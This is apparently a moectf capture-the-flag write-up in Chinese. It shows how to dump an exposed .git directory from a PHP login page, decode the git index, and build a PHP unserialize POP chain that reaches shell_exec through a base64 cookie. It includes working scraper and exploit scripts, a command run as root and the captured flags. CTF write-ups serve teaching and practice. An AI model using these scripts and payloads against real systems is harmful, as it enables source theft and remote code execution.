[stage1 CL.TE ] HTTP/1.1 200 OK -> flag1: moectf{Y0u_have_m4r
[stage2 TE混淆] HTTP/1.1 200 OK -> flag2: 3d_http_5mu6g1!n6}
```

---

# 七狗收费小说

## 小刻想把自己的小说库改成收费的，这样就可以赚钱买更多的蜜饼吃啦。所以小刻自学了 Git 和 PHP，刚刚做了个半成品的登录页面。但是，小刻缺少一个 CTFer 的警觉，她把仓库直接放到了生产环境，居然还信任前端传来的任何数据。作为一个 CTFer，你和小刻打赌，如果你找不出小说库的漏洞，就要请她吃一个月的蜜饼……（环境为 PHP 8.2）

从`仓库直接放到了生产环境`判断仓库泄露了，直接从以下路径探测
| 路径 | 泄露内容 |
| --- | --- |
| `/.git/HEAD`、`/.git/config` | Git 仓库 → 全部源码 |
| `/.svn/wc.db`、`/.svn/entries` | SVN 仓库 → 全部源码 |
| `/.hg/` | Mercurial 仓库 |
| `/.DS_Store` | macOS 打包遗留，暴露目录结构 |
| `/backup.zip`、`/www.zip`、`/web.tar.gz` | 源码备份包 |
| `/.env`、`/.env.bak` | 数据库密码、密钥 |
| `/composer.json`、`/package.json` | 依赖与框架版本（判断已知 CVE） |
| `/phpinfo.php`、`/info.php` | PHP 配置 |
| `/robots.txt`、`/sitemap.xml` | 敏感目录线索 |

发现
```
GET /.git/HEAD   ->  200 OK
ref: refs/heads/master
```

正文是 `ref: refs/heads/master`，说明静态服务器把 `.git` 目录当普通文件目录暴露了，而且没有任何过滤。既然能读 `HEAD`，那 `config`、`index`、`objects/` 大概率也都能读。

那么可以尝试去爬源码
Git 的 `.git/objects/` 目录下存放着仓库里**每一个文件内容**的压缩副本（zlib 压缩）。拿到它们就等于拿到源码。

对象有两种存在形式：

| 形式 | 路径 | 说明 |
| --- | --- | --- |
| loose object（松散对象） | `.git/objects/aa/bbbb...`（前 2 位做目录） | 新提交的对象，一文件一对象 |
| packfile（打包对象） | `.git/objects/pack/pack-*.pack` | `git gc` 之后才会出现，需要解 pack |

这题是刚建的仓库（`commit (initial)`），所以全是 loose object，直接按文件名下载即可，不用处理 pack。

直接访问`.git/index`会下载文件，拆解文件
```
0000  44 49 52 43 00 00 00 02 00 00 00 01 6a 4a 66 03  DIRC........jJf.
0010  29 f7 c8 1b 6a 4a 66 03 29 f7 c8 1b 00 00 08 01  )...jJf.).......
0020  00 4c 05 34 00 00 81 a4 00 00 03 e8 00 00 03 e8  .L.4............
0030  00 00 0a 21 ef bd c1 8e 0c 21 e9 a2 72 ab f6 d0  ...!.....!..r...
0040  5e 71 c7 75 28 5f 1b 80 00 09 69 6e 64 65 78 2e  ^q.u(_....index.
0050  70 68 70 00 54 52 45 45 00 00 00 19 00 31 20 30  php.TREE.....1 0
0060  0a 4d 89 fd 21 5e 66 ba 9c 22 26 76 43 da 9c 16  .M..!^f.."&vC...
0070  4d 9c 9e de 54 ca 4b 5a 95 24 a3 b1 2d f0 ea e3  M...T.KZ.$..-...
0080  98 aa 28 4a e0 0f c8 0a 6f                       ..(J....o
```

整体布局：

| 偏移 | 长度 | 内容 | 本例 |
| --- | --- | --- | --- |
| `0x00` | 4 | 魔数 `DIRC`（"dir cache"） | ✓ |
| `0x04` | 4 | 版本号 | 2 |
| `0x08` | 4 | entry 数量 | 1 |
| `0x0C` | 72 | 一个 entry | 见下表 |
| `0x54` | 33 | `TREE` 扩展 | 8 字节头 + 25 字节数据 |
| `0x75` | 20 | 整个文件的 SHA-1 校验和 | ✓ 实测匹配 |

entry 的前 62 字节是定长区：

| 字节 | 字段 | 本例值 |
| --- | --- | --- |
| 0–7 | ctime 秒 + 纳秒 | |
| 8–15 | mtime 秒 + 纳秒 | 2026-07-05 22:11:15 |
| 16–23 | dev / ino | |
| 24–27 | mode | `0o100644`（普通文件 644） |
| 28–35 | uid / gid | 1000 / 1000 |
| 36–39 | size | 2593 |
| **40–59** | **blob SHA-1** | **`efbdc18e...`** |
| 60–61 | flags（低 12 位 = 文件名长度） | 9 |
| 62+ | 文件名 + NUL 对齐填充 | `index.php` |

那 20 个字节是**文件内容**的 SHA-1（不是路径的哈希）。拼成 `.git/objects/ef/bdc18e...` 下载解压，就是 `index.php` 全文 2593 字节，和 index 里记的 size 完全对上。

也就是说`index`可以看到全部文件名和blob SHA（明文）

拆解`index`
脚本：
```python
import hashlib
import struct
import time
import zlib

INDEX = "leaked_repo/index"
OBJP = "leaked_repo/objects/ef/bdc18e0c21e9a272abf6d05e71c775285f1b80"
COMMITP = "leaked_repo/objects/22/16505f05a8e6f24d6be640001e459e8a40bac4"


def rule(title):
    print()
    print("=" * 68)
    print(title)
    print("=" * 68)


def hexdump(raw):
    for i in range(0, len(raw), 16):
        c = raw[i:i + 16]
        h = " ".join("%02x" % b for b in c).ljust(47)
        a = "".join(chr(b) if 32 <= b < 127 else "." for b in c)
        print("%04x  %s  %s" % (i, h, a))


def git_object_sha(kind, content):
    """Git 的「内容寻址」规则：SHA1("<类型> <长度>\\0" + 内容)

    注意长度是**字节数**的十进制，不是十六进制，而且 \x00 是分隔符。
    整个 SHA-1 只由内容决定 —— 这就是为什么对象文件名能被当成"钥匙"。
    """
    header = ("%s %d" % (kind, len(content))).encode() + b"\x00"
    return hashlib.sha1(header + content).hexdigest()


raw = open(INDEX, "rb").read()
blob = zlib.decompress(open(OBJP, "rb").read()).split(b"\x00", 1)[1]

# ---------------------------------------------------------------- ① 找锚点
rule("① 找锚点：先把 ASCII 能看懂的字符串圈出来")
hexdump(raw)
print()
print("肉眼能直接读出来的字符串（这就是坐标系）：")
for token in (b"DIRC", b"TREE", b"index.php"):
    pos = raw.find(token)
    print("  %-10s 出现在偏移 0x%02X" % (token.decode(), pos))
print()
print("从 hexdump 可以读出三个「骨架」位置：")
print("  0x00  'DIRC'      -> 魔数，文件类型标志")
print("  0x0C  后面全是二进制，说明 entry 从这开始")
print("  0x54  'TREE'      -> 另一段的开始（扩展区签名）")

# --------------------------------------------------- ② 用已知量反推字段
rule("② 用已知量反推：把「已知」当成探针，去字节流里搜")

known_size = 2593
needle = struct.pack(">I", known_size)
print("已知文件大小是 %d 字节。" % known_size)
print("它的 4 字节大端表示是 %s（即 0x%08X）" % (needle.hex(" "), known_size))
print("在 index 里搜这段字节 -> 偏移 0x%02X" % raw.find(needle))
print()
print("  0x0C + 36 = 0x30，正好命中！")
print("  结论：entry 的第 36~39 字节就是 size 字段，而且是**大端序**（高位在前）。")

known_sha = bytes.fromhex("efbdc18e0c21e9a272abf6d05e71c775285f1b80")
print()
print("已知源码对象的文件名是 efbdc18e0c21e9a2...（从 objects/ef/bdc18e... 反推）")
print("把这 20 字节当探针去搜 -> 偏移 0x%02X" % raw.find(known_sha))
print()
print("  0x0C + 40 = 0x34，又命中！")
print("  结论：entry 的第 40~59 字节是内容对应的 blob SHA-1（20 字节定长）。")
print()
print("这一步就是「分辨」的核心思路：")
print("  **不需要先知道格式，只要手里有一个已知量（文件名/大小/哈希），")
print("    把它变成字节去搜，命中位置直接告诉你字段在哪、占几字节、什么字节序。**")

# ------------------------------------------------------- 解析头部 + entry
rule("③ 按锚点切开，逐字段解析")

magic = raw[:4]
ver, cnt = struct.unpack(">II", raw[4:12])
print("魔数      : %r   （ASCII 可读，作为文件类型标识）" % magic)
print("版本号    : %d     （4 字节大端）" % ver)
print("entry 数量: %d     （4 字节大端）" % cnt)
print()
print("头部共 12 字节，所以第一个 entry 从 0x0C 开始。")
print()

e = raw[12:12 + 62]
ctime, ctns, mtime, mtns, dev, ino, mode, uid, gid, size = struct.unpack(">10I", e[:40])
flags = struct.unpack(">H", e[60:62])[0]
namelen = flags & 0xFFF
name = raw[12 + 62:12 + 62 + namelen].decode()

print("entry 的 62 字节定长区（全部大端整数）：")
print("  字节  0~7   ctime = %s  （秒+.纳秒）" % time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(ctime)))
print("  字节  8~15  mtime = %s  （秒+.纳秒）" % time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(mtime)))
print("  字节 16~19  dev=0x%X" % dev)
print("  字节 20~23  ino=0x%X" % ino)
print("  字节 24~27  mode 0x%X = 0o%o  ← 文件类型 + 权限位" % (mode, mode))
print("  字节 28~31  uid=%d" % uid)
print("  字节 32~35  gid=%d" % gid)
print("  字节 36~39  size=%d        ← 第②步搜出来的" % size)
print("  字节 40~59  blob=%s  ← 第②步搜出来的" % e[40:60].hex())
print("  字节 60~61  flags=0x%04X  低 12 位 = %d = 文件名长度" % (flags, namelen))
print("  字节 62~..  文件名 %r + NUL 对齐填充" % name)
print()
print("mode 位含义（和 Linux 权限位一致，高 4 位表示类型）：")
print("  0o100644 = 普通文件(100) + 权限 644")
print("  0o120000 = 符号链接     -> 这类文件值得单独看")
print("  0o160000 = 子模块 gitlink -> 指向另一个仓库")

entry_len = (62 + namelen + 8) & ~7
print()
print("entry 总占位 = (62 + 文件名长度 + 8) & ~7")
print("            = (62 + %d + 8) & ~7 = %d 字节" % (namelen, entry_len))
print("说明：文件名后面要补 1~8 个 0x00，让整个 entry 长度对齐到 8 的倍数。")
print("验证对齐公式对不对：0x0C + %d = 0x%02X" % (entry_len, 12 + entry_len))
print("而 0x%02X 处正好是 %r —— 公式成立，扩展区起点正确。" % (12 + entry_len, raw[12 + entry_len:12 + entry_len + 4].decode()))

# ------------------------------------------------------------ 验证 1
rule("验证 1：末尾 20 字节是不是「整文件的校验和」")
body, tail = raw[:-20], raw[-20:]
print("末尾 20 字节      : %s" % tail.hex())
print("前面 %d 字节的SHA1: %s" % (len(body), hashlib.sha1(body).hexdigest()))
print("-> %s" % ("一致，确认它是自校验和" if hashlib.sha1(body).hexdigest() == tail.hex() else "不一致"))
print()
print("推论：既然末尾 20 字节是校验和，那它**不是**对象 SHA。")
print("粗筛 `[0-9a-f]{40}` 会把它误当成一个对象去请求（404，无害但很干扰），")
print("写工具时应直接切掉 raw[-20:]。")

# ------------------------------------------------------------ 验证 2
rule("验证 2：那 20 字节真的是「内容哈希」吗？（最关键的证明）")
calc = git_object_sha("blob", blob)
print('Git 的对象命名规则：SHA1("blob <字节长度>\\0" + 内容)')
print()
print("  源码内容长度      : %d" % len(blob))
print('  实际参与哈希的头部: %r' % (("blob %d" % len(blob)).encode() + b"\x00"))
print("  重算出的 SHA1     : %s" % calc)
print("  entry 里记的 SHA1 : %s" % e[40:60].hex())
print("-> %s" % ("完全一致 ✅" if calc == e[40:60].hex() else "不一致 ❌"))
print()
print("这条证明了三件事：")
print("  a) entry 第 40~59 字节确实是**文件内容的哈希**，不是路径哈希")
print("  b) 我们下载并解压出的内容，就是这个哈希对应的内容（没被篡改）")
print("  c) entry 里的 size 字段 %d 也对了（因为长度是哈希输入的一部分）" % size)

# ------------------------------------------------------------ 验证 3
rule("验证 3：TREE 扩展里的 SHA 对不对？")
ext = raw[12 + entry_len:-20]
sig, extlen = ext[:4].decode(), struct.unpack(">I", ext[4:8])[0]
data = ext[8:8 + extlen]
# TREE 扩展格式：NUL 结尾的路径 + 空格分隔的 entry/subtree 数量 + \n + 每个子树的 20 字节 SHA
line_end = data.index(b"\n")
tree_sha = data[line_end + 1:line_end + 21].hex()
commit_body = zlib.decompress(open(COMMITP, "rb").read()).split(b"\x00", 1)[1].decode()
commit_tree = commit_body.splitlines()[0].split()[1]

print("扩展签名      : %r，声明长度 %d 字节" % (sig, extlen))
print("扩展内容      : %r" % data)
print("  -> 空路径(NUL) + 数量声明 %r" % data[1:line_end].decode())
print("  -> 之后跟 20 字节 SHA = %s" % tree_sha)
print()
print("拿 commit 对象里的 tree 行来对：")
print("  commit 正文第一行: %r" % commit_body.splitlines()[0])
print("  从 commit 里读到的 tree SHA: %s" % commit_tree)
print("-> %s" % ("两者一致 ✅ 扩展区解析正确，偏移没算错" if tree_sha == commit_tree else "不一致 ❌"))

rule("结论")
print("三个锚点（DIRC / TREE / index.php）给了骨架，")
print("两个已知量（2593 / blob 文件名）定位了字段边界，")
print("三重验证（自校验和 / 哈希重算 / 交叉引用）证明了理解正确。")
print()
print("这就是「分辨」陌生二进制格式的通用套路：")
print("  锚点定坐标 -> 已知量探边界 -> 自洽性做证明。")
print("缺了第三步，前面都只是猜。")
```
分三步：
1. 找锚点    —— 先把看得懂的 ASCII 字符串圈出来，给自己建坐标系，`DIRC`(0x00)、`TREE`(0x54)、`index.php`(0x4A) 把文件切成几段，骨架就有了
2. 用已知量反推 —— 已知文件叫 index.php、大小 2593，
                      就在字节流里搜 2593（大端 = 00 00 0a 21），
                      搜到在哪就知道 size 字段在哪、字节序是什么
| 已知量 | 编成字节 | 搜索命中 | 推出的结论 |
| --- | --- | --- | --- |
| 大小 2593 | `00 00 0a 21` | `0x30` = `0x0C + 36` | size 在 entry 第 36~39 字节，**大端序** |
| blob 文件名 `efbdc18e...` | `ef bd c1 8e ...`（20 字节） | `0x34` = `0x0C + 40` | blob SHA 在 entry 第 40~59 字节 |
3. 验证      —— 必须有办法证明「我的理解是对的」，否则只是猜

三重验证：
- 验证 1：文件末尾 20 字节 == SHA1(它前面的全部字节)   → 证明边界和校验和
- 验证 2：SHA1("blob 2593\\0" + 源码) == entry 里那 20 字节 → 证明「那是内容哈希」
- 验证 3：TREE 扩展里的 SHA == commit 里写的 tree SHA  → 证明扩展区偏移算对了
| # | 验证内容 | 结果 | 证明了什么 |
| --- | --- | --- | --- |
| 1 | 末尾 20 字节 == `SHA1(前面所有字节)` | ✅ | 它是文件自校验和，**不是**对象 SHA |
| 2 | `SHA1("blob 2593\0" + 源码)` == entry 里那 20 字节 | ✅ | 那确实是**内容哈希**（不是路径哈希），并反证 size 正确 |
| 3 | `TREE` 扩展里的 SHA == commit 里写的 tree SHA | ✅ | 扩展区偏移算对了 |

git内容寻址
```python
# Git 对象的名字 = SHA1("<类型> <字节长度>\0" + 内容)
# 注意：长度是十进制的字节数，\0 是分隔符，类型是 blob/tree/commit
header = ("blob %d" % len(content)).encode() + b"\x00"
sha = hashlib.sha1(header + content).hexdigest()
```

正因为哈希**只由内容决定**，对象文件名本身就是一把钥匙 —— 知道文件名就能直接去 `.git/objects/` 取内容。这也是前面说 index 是「捷径」的根本原因。

下一步还原仓库，读取源码

脚本：
```python
import os
import re
import sys
import zlib
import urllib.request

# 靶机地址：换题时只改这一行
BASE = "http://127.0.0.1:57742"
OUT = "leaked_repo"


def http_get(path):
    """下载一个路径，404 返回 None"""
    url = BASE + "/" + path.lstrip("/")
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            return r.read()
    except Exception:
        return None


def save(rel, data):
    full = os.path.join(OUT, rel)
    os.makedirs(os.path.dirname(full), exist_ok=True)
    with open(full, "wb") as f:
        f.write(data)


def parse_index(raw):
    """解析 .git/index，取出所有 blob 的 sha1

    index 结构（version 2）：
        "DIRC" + 版本号(4) + entry 数量(4)
        然后每个 entry 定长 62 字节，再跟上变长的文件名，
        最后补 1~8 个 0x00 让整个 entry 长度对齐到 8 的倍数。
        62 字节里**下标 40~59**（0 基）那 20 字节就是该文件内容对应的 blob SHA-1。
    """
    shas = set()
    if raw[:4] != b"DIRC":
        return shas
    ver = int.from_bytes(raw[4:8], "big")
    cnt = int.from_bytes(raw[8:12], "big")
    off = 12
    for _ in range(cnt):
        entry = raw[off:off + 62]
        shas.add(entry[40:60].hex())
        namelen = int.from_bytes(entry[60:62], "big") & 0xFFF
        off += (62 + namelen + 8) & ~7
    return shas


def main():
    # 0) 先探活。靶机不可达时必须**立刻报错退出**，
    #    否则所有 http_get 都静默返回 None，脚本会"跑完"却什么都没下到，
    #    看起来像成功、其实是空跑 —— 这种静默失败最容易把排查带偏。
    probe = http_get(".git/HEAD")
    if probe is None:
        print("[!] 无法访问 %s/.git/HEAD" % BASE)
        print("    靶机没起 / 端口转发断开 / 后端容器已销毁，先确认环境再跑。")
        sys.exit(1)
    print("[*] 靶机可达，HEAD = %r" % probe.decode("utf-8", "replace").strip())

    # 1) 先把 git 的元信息文件都拖下来
    meta = [".git/HEAD", ".git/config", ".git/index", ".git/logs/HEAD",
            ".git/description", ".git/COMMIT_EDITMSG"]
    for m in meta:
        d = http_get(m)
        if d is not None:
            save(m[len(".git/"):], d)
            print("[meta] %-24s %d bytes" % (m, len(d)))

    # 2) 从 logs/HEAD 里抓出 commit sha
    #    注意：re.findall(rb"...", ...) 返回的是 bytes，必须 decode 成 str，
    #    否则后面拼 URL 会变成 "b'22'/b'16505f...'" 这种畸形路径（踩过这个坑）。
    shas = set()
    ZERO = "0" * 40
    log = http_get(".git/logs/HEAD")
    if log:
        shas |= {s.decode() for s in re.findall(rb"\b([0-9a-f]{40})\b", log)}
    shas.discard(ZERO)          # 首次提交的 old-value 是全 0，不是有效对象
    idx = http_get(".git/index")
    if idx:
        shas |= parse_index(idx)

    # 3) 已经下载过的 object 直接读本地，未下载的从服务器拉
    todo = list(shas)
    seen = set()
    while todo:
        sha = todo.pop()
        if sha in seen:
            continue
        seen.add(sha)
        path = ".git/objects/%s/%s" % (sha[:2], sha[2:])
        local = os.path.join(OUT, path[len(".git/"):])
        if os.path.exists(local):
            raw = zlib.decompress(open(local, "rb").read())
        else:
            comp = http_get(path)
            if comp is None:
                print("[miss] %s" % sha)
                continue
            save(path[len(".git/"):], comp)
            try:
                raw = zlib.decompress(comp)
            except Exception as e:
                print("[bad ] %s %s" % (sha, e))
                continue
            print("[obj ] %s %s (%d bytes)" % (sha[:8], raw.split(b" ")[0].decode(), len(raw)))

        # commit / tree 里都藏着别的 sha，继续递归
        for s in re.findall(rb"\b([0-9a-f]{40})\b", raw):
            s = s.decode()
            if s not in seen:
                todo.append(s)


if __name__ == "__main__":
    main()
```
完整链条一次打通：

```
commit 2216505f  →  tree 4d89fd21  →  blob efbdc18e  (index.php)

提交信息：小刻的第一个comit
作者：Frank Yang <yichengyoung@gmail.com>
```

tree 对象的正文格式是 `<mode> <文件名>\0<20 字节 blob SHA-1>`，本例解出来是这样：

```
100644 index.php\0  efbdc18e0c21e9a272abf6d05e71c775285f1b80
```

blob 解压后就是完整源码：

```php
<?php
// 小刻可是学了最新的 PHP 8 哦，快夸夸小刻
error_reporting(0);

class User
{
    public $username, $password;
    public $secret_a, $secret_b;

    public function __construct($username, $password)
    {
        $this->username = $username;
        $this->password = $password;
        $this->secret_a = $this->secret_b = 0;
    }

    public function __wakeup()
    {
        // 每次都要重新登录，这样坏人肯定进不来啦
        $this->secret_b = random_int(1000_0000, 9999_9999);
    }

    public function __destruct()
    {
        if ($this->username !== $this->password)
            die("不对，密码不对！");
        if ($this->secret_a !== $this->secret_b)
            die("不行，要重新登录！");

        echo "已经登录啦：$this->username";
    }
}

class UserInfo
{
    public $user, $permission;

    public function __construct($user)
    {
        $this->user = $user;
        $this->permission = $user->username === "admin" ? "权限 7" : "权限 0";
    }

    public function __tostring()
    {
        return $this->user->username . "（权限等级：" . $this->permission . "）";
    }
}

class Diagnosis
{
    public $key, $value, $action;

    public function __get($name)
    {
        if ($name === $this->key && is_object($this->action)) {
            return ($this->action)($this->value);
        }
        return null;
    }

    public function __invoke($value)
    {
        return shell_exec("$this->key$value");
    }
}

$curr_user = null;

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $user = new User($username, $password);

    $data = base64_encode(serialize($user));
    setcookie('user', $data, time() + 3600, '/');
    $curr_user = $user;

} elseif (isset($_COOKIE['user'])) {
    $data = base64_decode($_COOKIE['user']);
    $curr_user = unserialize($data);   // <-- 危险点在这里
}
?>
```

直接看最后几行：

```php
$data = base64_decode($_COOKIE['user']);
$curr_user = unserialize($data);
```

**`unserialize()` 的输入完全来自 Cookie，没有任何过滤、没有任何白名单。** 这就是题目说的「信任前端传来的任何数据」。

| 方法 | 什么时候被自动调用 |
| --- | --- |
| `__wakeup()` | 对象被 `unserialize()` 还原之后 |
| `__destruct()` | 对象被销毁（通常是脚本结束）时 |
| `__toString()` | 对象被当成字符串使用（`echo`、`.` 拼接）时 |
| `__get($name)` | 读取**不存在或不可访问**的属性时 |
| `__invoke(...)` | 对象被当成函数调用时，如 `$obj()` |

关键点：**这些方法全部是自动触发的，攻击者不需要手动调用任何一行**。只要构造出正确的对象图，PHP 会帮你一层层跳过去。

高危函数：

```php
public function __invoke($value)
{
    return shell_exec("$this->key$value");
}
```

`Diagnosis::__invoke` 里有 `shell_exec()`，命令由 `$this->key` 和 `$value` 拼接而成 —— **完全可控**。我们的目标就是让程序走到这里。

逆着危险函数往回推：

```
Diagnosis::__invoke        ← 终点，命令执行
        ↑ 被谁调用？
Diagnosis::__get           ← ($this->action)($this->value)
        ↑ 谁触发了属性读取？
UserInfo::__toString       ← $this->user->username
        ↑ 谁把对象当字符串？
User::__destruct           ← echo "已经登录啦：$this->username"
        ↑ 谁触发析构？
unserialize($_COOKIE)      ← 起点
```

于是链条成型：

```
unserialize
  └─ User::__destruct           echo "$this->username"
       └─ UserInfo::__toString  $this->user->username
            └─ Diagnosis::__get 访问不存在的 username 属性
                 └─ Diagnosis::__invoke  shell_exec()
```

调节各节点参数
**① `User::__destruct` 要走到 `echo`**
把 `$username` 设成 `UserInfo` 对象。`echo` 一个对象 → PHP 去找它的 `__toString()`。
（注意源码里写的是 `__tostring`，PHP 方法名不区分大小写，不影响。）

**② `UserInfo::__toString` 要触发 `__get`**
它访问 `$this->user->username`。把 `$this->user` 设成 `Diagnosis` 对象，而 `Diagnosis` 里**没有** `username` 这个属性 → 自动调用 `__get("username")`。

**③ `Diagnosis::__get` 要走到 `__invoke`**

```php
if ($name === $this->key && is_object($this->action)) {
    return ($this->action)($this->value);
}
```

两个条件：
- `$this->key === "username"`（因为传进来的 `$name` 就是 `"username"`）
- `$this->action` 是个对象（`is_object` 检查）

把 `action` 设成**另一个 `Diagnosis` 对象**，它满足 `is_object()`，同时有 `__invoke()`，所以 `($this->action)($this->value)` 能调用成功。

**④ 外层 `Diagnosis::__invoke` 拿到命令**

```php
return shell_exec("$this->key$value");
```

这里 `$this` 是**内层**那个 `Diagnosis`。因为外层 `__get` 调用的是 `($this->action)($this->value)`，`$this->value` 作为参数传进去，所以：

```
最终命令 = 内层.key + 外层.value
```

最简单的配法：内层 `key` = 要执行的命令，外层 `value` = `""`（空串）。

链条设计好了，但 `User::__destruct` 门口还有两道安检：

```php
if ($this->username !== $this->password)  die("不对，密码不对！");
if ($this->secret_a !== $this->secret_b)  die("不行，要重新登录！");
```

注意都是 **`!==`（不全等）**，比 `!=` 严格得多：不仅值要相等，类型也要完全一样。

卡点 ①：`username !== password`

我们希望 `username` 是 `UserInfo` 对象（为了触发 `__toString`），那就得让 `password` 也「等于」它。

新手容易想：那我 `password` 也写一个一模一样的 `UserInfo` 不就行了？**不行。** 对对象来说，`!==` 比较的是**是不是同一个实例**：

```php
$a = new UserInfo($x);
$b = new UserInfo($x);   // 内容完全一样
var_dump($a !== $b);     // true  —— 两个不同实例，仍然不全等
```

**解法：让 `password` 成为 `username` 的引用**，指向同一个对象。序列化格式里，重复引用同一个对象用 `r:N` 表示（`r` 是 object reference，`N` 是对象编号）：

```
s:8:"username"; O:8:"UserInfo":2:{...}
s:8:"password"; r:2;          ← 指回第 2 个对象，即 UserInfo 本身
```

卡点 ②：`secret_a !== secret_b`

`__wakeup()` 会在反序列化后把 `secret_b` 重置成一个 8 位随机数：

```php
public function __wakeup()
{
    $this->secret_b = random_int(1000_0000, 9999_9999);
}
```

我们没法预测这个随机数，看起来必死。

**在 PHP 5 时代**，有个著名技巧（CVE-2016-7124）：把序列化串里的属性数量写大一点，比如 `O:4:"User":5:{...}`（实际只有 4 个属性），PHP 会认为反序列化失败，从而**跳过 `__wakeup()`**。

**但题目特意标了 PHP 8.2** —— 这个洞在 PHP 7 就修了，现在属性数量对不上会直接报错。所以必须换思路。

**正解：利用引用（reference）让两个属性共用同一个内存槽位。**

序列化格式里：
- `r:N` = 对象引用（同一个对象实例）
- `R:N` = **值引用**（同一个 zval，改一个另一个跟着变）

把 `secret_b` 写成 `R:N` 指向 `secret_a` 的槽位，两个属性就变成了同一个变量的两个名字：

```
__wakeup 执行 $this->secret_b = random_int(...)
    ↓ secret_b 只是一个别名，赋值实际写进了 secret_a 的槽位
    ↓
secret_a 和 secret_b 同时变成那个随机数
    ↓
$strict !== 比较 → 两者完全一致 → 通过 ✓
```

这招的精髓是：**不要去猜随机数，而是让随机数写进来的时候，两个变量一起变。**

卡点 ②补充：`N` 到底填几？

这是本题唯一需要动脑子的数字。`R:N` 里的 `N` 是**序列化流中「值」的编号**，规则是：

| 算不算一个编号 | 内容 |
| --- | --- |
| ✅ 算 | 每一个值：对象、字符串、整数、`N`（null） |
| ❌ 不算 | 属性名 / 数组下标这类"键" |

先用一个最小结构做对照组实验（脚本 `calib.py`），确认规律：

```
O:4:"User":4:{s:8:"username";s:1:"a";s:8:"password";s:1:"a";s:8:"secret_a";i:0;s:8:"secret_b";R:N;}
```

值的顺序：`① User 对象` → `② "a"` → `③ "a"` → `④ 0`（secret_a），实测 `R:4` 通过，规律确认 ✅

再用同样的数法数完整 payload：

| # | 值 | # | 值 |
| --- | --- | --- | --- |
| 1 | User 对象 | 7 | 内层 key（= 命令） |
| 2 | UserInfo 对象 | 8 | 内层 value |
| 3 | 外层 Diagnosis 对象 | 9 | 内层 action（`N`） |
| 4 | 外层 key（`"username"`） | 10 | permission（`"x"`） |
| 5 | 外层 value（`""`） | 11 | password（`r:2`） |
| 6 | 内层 Diagnosis 对象 | **12** | **secret_a（`i:0`）** |

所以 `secret_b` 应该写 `R:12`。

手工拼出的序列化串

```
O:4:"User":4:{
  s:8:"username";O:8:"UserInfo":2:{
    s:4:"user";O:9:"Diagnosis":3:{
      s:3:"key";s:8:"username";
      s:5:"value";s:0:"";
      s:6:"action";O:9:"Diagnosis":3:{
        s:3:"key";s:15:"cat /flag; id; ";
        s:5:"value";s:0:"";
        s:6:"action";N;
      };
    };
    s:10:"permission";s:1:"x";
  };
  s:8:"password";r:2;
  s:8:"secret_a";i:0;
  s:8:"secret_b";R:12;
}
```

> 拼字符串时最容易出错的是**长度字段**（`s:8:"username"` 里的 8）。`username`=8、`password`=8、`secret_a`=8、`secret_b`=8、`user`=4、`permission`=10、`key`=3、`value`=5、`action`=6，类名 `User`=4、`UserInfo`=8、`Diagnosis`=9。命令串的长度也要精确数。

最终脚本：
```python
import base64
import re
import sys
import urllib.request

TARGET = "http://127.0.0.1:57742/"
REF_INDEX = 12          # secret_a 的槽位序号
DEFAULT_CMD = "cat /flag; id; "

REF_INDEX_ALT = None    # 备用，无需改动


def build(cmd):
    """拼装恶意 User 对象的序列化字符串"""
    inner = (
        'O:9:"Diagnosis":3:{'
        's:3:"key";s:%d:"%s";'
        's:5:"value";s:0:"";'
        's:6:"action";N;'
        '}' % (len(cmd), cmd)
    )
    outer = (
        'O:9:"Diagnosis":3:{'
        's:3:"key";s:8:"username";'
        's:5:"value";s:0:"";'
        's:6:"action";' + inner +
        '}'
    )
    userinfo = (
        'O:8:"UserInfo":2:{'
        's:4:"user";' + outer +
        's:10:"permission";s:1:"x";'
        '}'
    )
    return (
        'O:4:"User":4:{'
        's:8:"username";' + userinfo +
        's:8:"password";r:2;'
        's:8:"secret_a";i:0;'
        's:8:"secret_b";R:%d;'
        '}' % REF_INDEX
    )


def exploit(cmd):
    payload = build(cmd)
    cookie = base64.b64encode(payload.encode()).decode()
    req = urllib.request.Request(TARGET, headers={"Cookie": "user=" + cookie})
    html = urllib.request.urlopen(req, timeout=10).read().decode("utf-8", "replace")

    m = re.search(r"已经登录啦：(.*?)（权限等级", html, re.S)
    if not m:
        print("[!] 利用失败，服务器返回：")
        print(html[-800:])
        return None
    return m.group(1)


if __name__ == "__main__":
    command = " ".join(sys.argv[1:]) or DEFAULT_CMD
    print("[*] payload =", build(command))
    print("[*] 执行命令:", command)
    print("-" * 60)
    out = exploit(command)
    if out is not None:
        print(out.strip())
```

执行：

```bash
python3 exp.py
```

输出：

```
[*] 执行命令: cat /flag; id;
------------------------------------------------------------
moectf{22cab615-45e4-9e91-891f-5f833cae614e}
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

---

